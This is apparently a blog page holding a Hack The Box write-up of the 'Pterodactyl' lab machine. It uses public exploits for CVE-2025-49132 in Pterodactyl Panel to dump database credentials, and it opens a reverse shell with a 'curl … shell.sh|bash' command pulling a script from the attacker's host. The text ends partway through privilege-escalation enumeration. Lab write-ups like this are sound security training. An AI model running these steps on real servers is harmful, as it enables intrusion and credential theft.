@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr"><head><title>Pterodactyl</title><meta charset="utf-8"/><link rel="preload" href="../index.css" as="style"/><link rel="preload" href="../prescript.js" as="script"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted Grotesk:wght@400;700&amp;family=Source Sans Pro:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="Adan Silva's Website"/><meta property="og:title" content="Pterodactyl"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Pterodactyl"/><meta name="twitter:description" content="Flags User 21c43d3b578be90a6d326c04d4b9e968 Root 028be0fd1e973b31b91fdfbb7097bad3 Notes First, we will do a scan rustscan --ulimit 5000 --addresses &quot;10.129.19.39&quot; --top -- -sC -sV From the results, we can see that we have a SSH and a web server pointing towards a domain named pterodactyl.h..."/><meta property="og:description" content="Flags User 21c43d3b578be90a6d326c04d4b9e968 Root 028be0fd1e973b31b91fdfbb7097bad3 Notes First, we will do a scan rustscan --ulimit 5000 --addresses &quot;10.129.19.39&quot; --top -- -sC -sV From the results, we can see that we have a SSH and a web server pointing towards a domain named pterodactyl.h..."/><meta property="og:image:alt" content="Flags User 21c43d3b578be90a6d326c04d4b9e968 Root 028be0fd1e973b31b91fdfbb7097bad3 Notes First, we will do a scan rustscan --ulimit 5000 --addresses &quot;10.129.19.39&quot; --top -- -sC -sV From the results, we can see that we have a SSH and a web server pointing towards a domain named pterodactyl.h..."/><meta property="twitter:domain" content="secmancer.github.io"/><meta property="og:url" content="https://secmancer.github.io/hack-the-box---machines/pterodactyl"/><meta property="twitter:url" content="https://secmancer.github.io/hack-the-box---machines/pterodactyl"/><link rel="icon" href="../static/icon.png"/><meta name="description" content="Flags User 21c43d3b578be90a6d326c04d4b9e968 Root 028be0fd1e973b31b91fdfbb7097bad3 Notes First, we will do a scan rustscan --ulimit 5000 --addresses &quot;10.129.19.39&quot; --top -- -sC -sV From the results, we can see that we have a SSH and a web server pointing towards a domain named pterodactyl.h..."/><meta name="generator" content="Quartz"/><link href="../index.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-735924e0.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-589c1cea.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-bbc3f7c0.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-2911f5d1.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-e427079e.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-53b25b2b.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-c93c6a44.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-8a06014f.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-77d6a441.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-6ee21cee.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-1ea6ad18.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-34bdfded.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-788c9ca3.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-642859cd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-4abc06bd.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-274a3dfe.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-94cb6c84.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-58d5ff56.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-9f9b2774.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../component-7262b5a7.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-a12dcaa2.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-26a99b87.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-a5c806d2.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-6bd36952.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-9857b007.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="../static/resource-style-d3a1a224.css" rel="stylesheet" type="text/css" data-persist="true"/><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" data-persist="true"/><script src="../prescript.js" type="application/javascript" data-persist="true"></script><script type="application/javascript" data-persist="true">const fetchData = fetch("../static/contentIndex.json").then(data => data.json())</script><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted%20Grotesk%3Awght%40400%3B700&amp;family=Source%20Sans%20Pro%3Aital%2Cwght%400%2C400%3B0%2C600%3B1%2C400%3B1%2C600&amp;family=IBM%20Plex%20Mono%3Awght%40400%3B600&amp;display=swap"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image" content="https://secmancer.github.io/hack-the-box---machines/pterodactyl-og-image.webp"/><meta property="og:image:url" content="https://secmancer.github.io/hack-the-box---machines/pterodactyl-og-image.webp"/><meta name="twitter:image" content="https://secmancer.github.io/hack-the-box---machines/pterodactyl-og-image.webp"/><meta property="og:image:type" content="image/webp"/></head><body data-slug="hack-the-box---machines/pterodactyl" data-basepath><div id="quartz-root" class="page" data-frame="default"><div id="quartz-body"><div class="left sidebar"><h2 class="page-title"><a href="..">Adan Silva's Website</a></h2><div class="mobile-only"><div class="spacer"></div></div><div class="flex-component" style="flex-direction: row; flex-wrap: nowrap; gap: 0.5rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button" aria-label="Search" aria-expanded="false"><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg><p>Search</p></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something..." placeholder="Search for something..."/><div class="search-layout" data-preview="true" data-field-priority="[&quot;title&quot;,&quot;content&quot;,&quot;tags&quot;]"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode" aria-label="Dark mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="readermode" aria-label="Reader mode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="readerIcon" fill="currentColor" stroke="currentColor" stroke-width="0.2" stroke-linecap="round" stroke-linejoin="round" width="64px" height="64px" viewBox="0 0 24 24" aria-label="Reader mode"><title>Reader mode</title><g transform="translate(-1.8, -1.8) scale(1.15, 1.2)"><path d="M8.9891247,2.5 C10.1384702,2.5 11.2209868,2.96705384 12.0049645,3.76669482 C12.7883914,2.96705384 13.8709081,2.5 15.0202536,2.5 L18.7549359,2.5 C19.1691495,2.5 19.5049359,2.83578644 19.5049359,3.25 L19.5046891,4.004 L21.2546891,4.00457396 C21.6343849,4.00457396 21.9481801,4.28672784 21.9978425,4.6528034 L22.0046891,4.75457396 L22.0046891,20.25 C22.0046891,20.6296958 21.7225353,20.943491 21.3564597,20.9931534 L21.2546891,21 L2.75468914,21 C2.37499337,21 2.06119817,20.7178461 2.01153575,20.3517706 L2.00468914,20.25 L2.00468914,4.75457396 C2.00468914,4.37487819 2.28684302,4.061083 2.65291858,4.01142057 L2.75468914,4.00457396 L4.50368914,4.004 L4.50444233,3.25 C4.50444233,2.87030423 4.78659621,2.55650904 5.15267177,2.50684662 L5.25444233,2.5 L8.9891247,2.5 Z M4.50368914,5.504 L3.50468914,5.504 L3.50468914,19.5 L10.9478955,19.4998273 C10.4513189,18.9207296 9.73864328,18.5588115 8.96709342,18.5065584 L8.77307039,18.5 L5.25444233,18.5 C4.87474657,18.5 4.56095137,18.2178461 4.51128895,17.8517706 L4.50444233,17.75 L4.50368914,5.504 Z M19.5049359,17.75 C19.5049359,18.1642136 19.1691495,18.5 18.7549359,18.5 L15.2363079,18.5 C14.3910149,18.5 13.5994408,18.8724714 13.0614828,19.4998273 L20.5046891,19.5 L20.5046891,5.504 L19.5046891,5.504 L19.5049359,17.75 Z M18.0059359,3.999 L15.0202536,4 L14.8259077,4.00692283 C13.9889509,4.06666544 13.2254227,4.50975805 12.7549359,5.212 L12.7549359,17.777 L12.7782651,17.7601316 C13.4923805,17.2719483 14.3447024,17 15.2363079,17 L18.0059359,16.999 L18.0056891,4.798 L18.0033792,4.75457396 L18.0056891,4.71 L18.0059359,3.999 Z M8.9891247,4 L6.00368914,3.999 L6.00599909,4.75457396 L6.00599909,4.75457396 L6.00368914,4.783 L6.00368914,16.999 L8.77307039,17 C9.57551536,17 10.3461406,17.2202781 11.0128313,17.6202194 L11.2536891,17.776 L11.2536891,5.211 C10.8200889,4.56369974 10.1361548,4.13636104 9.37521067,4.02745763 L9.18347055,4.00692283 L8.9891247,4 Z"></path></g></svg></button></div></div><div class="explorer nav-files-container" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a2, b2) => {\n    if (!a2.isFolder &amp;&amp; !b2.isFolder || a2.isFolder &amp;&amp; b2.isFolder) {\n      return (a2.displayName || \&quot;\&quot;).localeCompare(b2.displayName || \&quot;\&quot;, void 0, {\n        numeric: true,\n        sensitivity: \&quot;base\&quot;\n      });\n    }\n    if (!a2.isFolder &amp;&amp; b2.isFolder) {\n      return 1;\n    }\n    return -1;\n  }&quot;,&quot;filterFn&quot;:&quot;(node) => node.slugSegment !== \&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;(node) => {\n    return node;\n  }&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-7" aria-label="Explorer"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div id="explorer-7" class="explorer-content" aria-expanded="false" role="group"><ul class="explorer-ul overflow" id="list-0"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#" class="nav-file-title tree-item-self"></a></li></template><template id="template-folder"><li><div class="folder-container nav-folder-title tree-item-self"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon nav-folder-collapse-indicator collapse-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content tree-item-children"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../hack-the-box---machines/">Hack The Box - Machines</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Pterodactyl</a></div></nav><h1 class="article-title">Pterodactyl</h1><p show-comma="true" class="content-meta"><time datetime="2026-07-18T04:28:01.000Z">Jul 17, 2026</time><span>13 min read</span></p></div></div><article class="popover-hint"><div class="markdown-preview-view markdown-rendered"><h1 id="flags">Flags<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#flags" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<ul>
+<li>User
+<ul>
+<li>21c43d3b578be90a6d326c04d4b9e968</li>
+</ul>
+</li>
+<li>Root
+<ul>
+<li>028be0fd1e973b31b91fdfbb7097bad3</li>
+</ul>
+</li>
+</ul>
+<h1 id="notes">Notes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#notes" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<ul>
+<li>First, we will do a scan</li>
+</ul>
+<pre><code>rustscan --ulimit 5000 --addresses &quot;10.129.19.39&quot; --top -- -sC -sV
+</code></pre>
+<ul>
+<li>From the results, we can see that we have a SSH and a web server pointing towards a domain named pterodactyl.htb</li>
+</ul>
+<pre><code>PORT   STATE SERVICE REASON         VERSION  
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)  
+| ssh-hostkey:    
+|   256 a3741ea3ad02140100e6abb4188416e0 (ECDSA)  
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOouXDOkVrDkob+tyXJOHu3twWDqor3xlKgyYmLIrPasaNjhBW/xkGT2otP1zmnkTUyGfzEWZGkZB2Jkaivmjgc=  
+|   256 65c833177ad6523d63c3e4a960642dcc (ED25519)  
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTXNuX5oJaGQJfvbga+jM+14w5ndyb0DN0jWJHQCDd9  
+80/tcp open  http    syn-ack ttl 63 nginx 1.21.5  
+|_http-title: Did not follow redirect to http://pterodactyl.htb/  
+|_http-server-header: nginx/1.21.5  
+| http-methods:    
+|_  Supported Methods: GET HEAD POST OPTIONS
+</code></pre>
+<ul>
+<li>So, we can go ahead and add that into our /etc/hosts</li>
+</ul>
+<pre><code>10.129.19.39    pterodactyl.htb
+</code></pre>
+<ul>
+<li>Visiting the website, looks like you average advertisement for a Minecraft server.</li>
+<li>Since it’s a Minecraft server, then some sort of admin panel could exist here.</li>
+<li>After all, Pterodactyl is also the name for a dashboard that can be used for game servers, which includes Minecraft</li>
+<li>I will go ahead and run a gobuster instance to find anything</li>
+</ul>
+<pre><code>gobuster dir -w `fzf-wordlists` -u http://pterodactyl.htb
+</code></pre>
+<ul>
+<li>While that goes, we are able to find a changelog with some more juicy information</li>
+</ul>
+<pre><code>MonitorLand - CHANGELOG.txt
+======================================
+
+Version 1.20.X
+
+[Added] Main Website Deployment
+--------------------------------
+- Deployed the primary landing site for MonitorLand.
+- Implemented homepage, and link for Minecraft server.
+- Integrated site styling and dark-mode as primary.
+
+[Linked] Subdomain Configuration
+--------------------------------
+- Added DNS and reverse proxy routing for play.pterodactyl.htb.
+- Configured NGINX virtual host for subdomain forwarding.
+
+[Installed] Pterodactyl Panel v1.11.10
+--------------------------------------
+- Installed Pterodactyl Panel.
+- Configured environment:
+  - PHP with required extensions.
+  - MariaDB 11.8.3 backend.
+
+[Enhanced] PHP Capabilities
+-------------------------------------
+- Enabled PHP-FPM for smoother website handling on all domains.
+- Enabled PHP-PEAR for PHP package management.
+- Added temporary PHP debugging via phpinfo()
+</code></pre>
+<ul>
+<li>Doing research, we learn that this version of Pterodactyl does have a vulnerability in it, that allows for remote code execution
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49132" class="external external-link">https://nvd.nist.gov/vuln/detail/CVE-2025-49132<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+</li>
+<li>It also seems like we have PHP + a MariaDB database going on, so our PHP reverse shells and stuff like that could work good here</li>
+<li>Looking at gobuster, only a subdomain named Public shows up, and that leads to a 403 Forbidden error.</li>
+</ul>
+<pre><code>===============================================================  
+Gobuster v3.8  
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)  
+===============================================================  
+[+] Url:                     http://pterodactyl.htb  
+[+] Method:                  GET  
+[+] Threads:                 10  
+[+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt  
+[+] Negative Status codes:   404  
+[+] User Agent:              gobuster/3.8  
+[+] Timeout:                 10s  
+===============================================================  
+Starting gobuster in directory enumeration mode  
+===============================================================  
+/Public               (Status: 301) [Size: 169] [--> http://pterodactyl.htb/Public/]
+</code></pre>
+<ul>
+<li>Oh well. Let’s try subdomains now</li>
+</ul>
+<pre><code>gobuster vhost -u &quot;http://pterodactyl.htb&quot; -w `fzf-wordlists` --append-domain
+</code></pre>
+<ul>
+<li>Aha! We have found our panel!</li>
+</ul>
+<pre><code>===============================================================  
+Gobuster v3.8  
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)  
+===============================================================  
+[+] Url:                       http://pterodactyl.htb  
+[+] Method:                    GET  
+[+] Threads:                   10  
+[+] Wordlist:                  /opt/lists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  
+[+] User Agent:                gobuster/3.8  
+[+] Timeout:                   10s  
+[+] Append Domain:             true  
+[+] Exclude Hostname Length:   false  
+===============================================================  
+Starting gobuster in VHOST enumeration mode  
+===============================================================  
+panel.pterodactyl.htb Status: 200 [Size: 1897]
+</code></pre>
+<ul>
+<li>Visting the website, we are greeted with a login screen</li>
+<li>Doing some research, it appears that Pterodactyl doesn’t use default credentials, so nothing that can be done there</li>
+<li>Looking more online, I was able to find some PoCs for CVE-2025-49132, so I think I will go ahead and start exploitation
+<ul>
+<li><a href="https://github.com/63square/CVE-2025-49132" class="external external-link">https://github.com/63square/CVE-2025-49132<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+</li>
+<li>Using these tools, I was able to confirm the existence of the vulnerability using the test</li>
+</ul>
+<pre><code>[Feb 10, 2026 - 19:54:00 (PST)] exegol-htb-season CVE-2025-49132 # python3 test.py http://panel.pterodactyl.htb  
+Target is vulnerable!
+</code></pre>
+<ul>
+<li>Cool, let’s go ahead and dump the database out</li>
+</ul>
+<pre><code>[Feb 10, 2026 - 19:55:14 (PST)] exegol-htb-season CVE-2025-49132 # python3 dump-creds.py http://panel.pterodactyl.htb  
+Target is vulnerable!  
+App key: base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=  
+  
+-- Database config --  
+{'default': 'mysql', 'connections': {'mysql': {'driver': 'mysql', 'url': '', 'host': '127.0.0.1', 'port': '3306', 'database': 'panel', 'username': 'pterodactyl', 'password': 'PteraPanel', 'unix_socket': '', 'charset': 'utf8mb4', 'collat  
+ion': 'utf8mb4_unicode_ci', 'prefix': '', 'prefix_indexes': '1', 'strict': '', 'timezone': '+00{{00}}', 'sslmode': 'prefer', 'options': {'1014': '1'}}}, 'migrations': 'migrations', 'redis': {'client': 'predis', 'options': {'cluster': 'r  
+edis', 'prefix': 'pterodactyl_database_'}, 'default': {'scheme': 'tcp', 'path': '/run/redis/redis.sock', 'host': '127.0.0.1', 'username': '', 'password': '', 'port': '6379', 'database': '0', 'context': []}, 'sessions': {'scheme': 'tcp',  
+'path': '/run/redis/redis.sock', 'host': '127.0.0.1', 'username': '', 'password': '', 'port': '6379', 'database': '1', 'context': []}}}  
+  
+-- Filesystem config --  
+{'default': 'local', 'disks': {'local': {'driver': 'local', 'root': '/var/www/pterodactyl/storage/app', 'throw': ''}, 'public': {'driver': 'local', 'root': '/var/www/pterodactyl/storage/app/public', 'url': 'http://panel.pterodactyl.htb/  
+storage', 'visibility': 'public', 'throw': ''}, 's3': {'driver': 's3', 'key': '', 'secret': '', 'region': '', 'bucket': '', 'url': '', 'endpoint': '', 'use_path_style_endpoint': '', 'throw': ''}}, 'links': {'/var/www/pterodactyl/public/  
+storage': '/var/www/pterodactyl/storage/app/public'}}  
+  
+-- Mail config --  
+{'default': 'smtp', 'mailers': {'smtp': {'transport': 'smtp', 'host': 'smtp.example.com', 'port': '25', 'encryption': 'tls', 'username': '', 'password': '', 'timeout': '', 'local_domain': 'panel.pterodactyl.htb'}, 'ses': {'transport': '  
+ses'}, 'mailgun': {'transport': 'mailgun'}, 'postmark': {'transport': 'postmark'}, 'sendmail': {'transport': 'sendmail', 'path': '/usr/sbin/sendmail -bs -i'}, 'log': {'transport': 'log', 'channel': ''}, 'array': {'transport': 'array'},  
+'failover': {'transport': 'failover', 'mailers': ['smtp', 'log']}}, 'from': {'address': 'no-reply@example.com', 'name': 'Pterodactyl Panel'}, 'markdown': {'theme': 'default', 'paths': ['/var/www/pterodactyl/resources/views/vendor/mail']  
+}}
+</code></pre>
+<ul>
+<li>Looks like I am able to pull out a credential set
+<ul>
+<li>pterodactyl:PteraPanel</li>
+</ul>
+</li>
+<li>I was also able to find the database name as well, along with the service running on 3306
+<ul>
+<li>pterodactyl:PteraPanel@127.0.0.1:3306/panel</li>
+</ul>
+</li>
+<li>Well, it looks like it’s on the inside, so no luck there.</li>
+<li>I think we are going to have to brute force our reverse shell in through this
+<ul>
+<li><a href="https://github.com/malw0re/CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10-" class="external external-link">https://github.com/malw0re/CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10-<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+</li>
+<li>I am then able to use this tool to get a reverse shell onto this box</li>
+</ul>
+<pre><code>[Feb 10, 2026 - 21:00:56 (PST)] exegol-htb-season CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10- # python3 ape1.py --host panel.pterodactyl.htb --interactive  
+  
+╔═══════════════════════════════════════════════════════════╗  
+║           CVE-2025-49132 PEAR RCE Exploit                ║  
+║           Target: panel.pterodactyl.htb                       ║  
+╚═══════════════════════════════════════════════════════════╝  
+  
+[+] Entering interactive shell mode  
+[*] Type 'exit' or 'quit' to leave  
+  
+shell> curl http://10.10.15.4:8080/shell.sh|bash  
+[*] Target: http://panel.pterodactyl.htb  
+[*] PEAR Path: ../../../../../../usr/share/php/PEAR  
+[*] Command: curl http://10.10.15.4:8080/shell.sh|bash  
+  
+[*] Writing payload to /tmp/shell.php...  
+[+] Payload written  
+[*] Executing payload...
+</code></pre>
+<ul>
+<li>We are able to get a shell going</li>
+</ul>
+<pre><code>wwwrun@pterodactyl:/var/www/pterodactyl/public> whoami  
+whoami  
+wwwrun
+</code></pre>
+<ul>
+<li>So, now from here, I was actually able to read out the user.txt file</li>
+</ul>
+<pre><code>wwwrun@pterodactyl:/home/phileasfogg3> cat user.txt  
+cat user.txt  
+21c43d3b578be90a6d326c04d4b9e968
+</code></pre>
+<ul>
+<li>I will go ahead and upgrade my shell</li>
+</ul>
+<pre><code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<ul>
+<li>I am unable to run sudo -l since I need a password, so I will go ahead and use LinEnum.sh to find anything</li>
+<li>I find something interesting in that we have access to filesystem commands and that udev is currently running</li>
+</ul>
+<pre><code>...
+root     13355  0.0  0.2  43648  5420 ?        S    07:09   0:00 (udev-worker)
+...
+[-] SUID files:                                                                                                                                                                                                                                
+-rwsr-x--- 1 root messagebus 56928 Jun 20  2023 /usr/lib/dbus-1/dbus-daemon-launch-helper                                                                                                                                                      
+-rwsr-xr-x 1 root root 14512 Jul 15  2025 /usr/lib/polkit-1/polkit-agent-helper-1                                                                                                                                                              
+-rwsr-xr-x 1 root root 302296 Jun 27  2025 /usr/bin/sudo                                                                                                                                                                                       
+-rwsr-xr-x 1 root shadow 58528 Oct 17  2024 /usr/bin/chfn                                                                                                                                                                                      
+-rwsr-xr-x 1 root shadow 44672 Oct 17  2024 /usr/bin/chsh                                                                                                                                                                                      
+-rwsr-xr-x 1 root shadow 18856 Oct 17  2024 /usr/bin/expiry                                                                                                                                                                                    
+-rwsr-xr-x 1 root shadow 70928 Oct 17  2024 /usr/bin/gpasswd                                                                                                                                                                                   
+-rwsr-xr-x 1 root shadow 37288 Oct 17  2024 /usr/bin/newgidmap                                                                                                                                                                                 
+-rwsr-xr-x 1 root root 36568 Oct 17  2024 /usr/bin/newgrp                                                                                                                                                                                      
+-rwsr-xr-x 1 root shadow 37288 Oct 17  2024 /usr/bin/newuidmap                                                                                                                                                                                 
+-rwsr-xr-x 1 root shadow 92256 Oct 17  2024 /usr/bin/passwd                                                                                                                                                                                    
+-rwsr-xr-x 1 root root 59712 Sep  5  2024 /usr/bin/mount                                                                                                                                                                                       
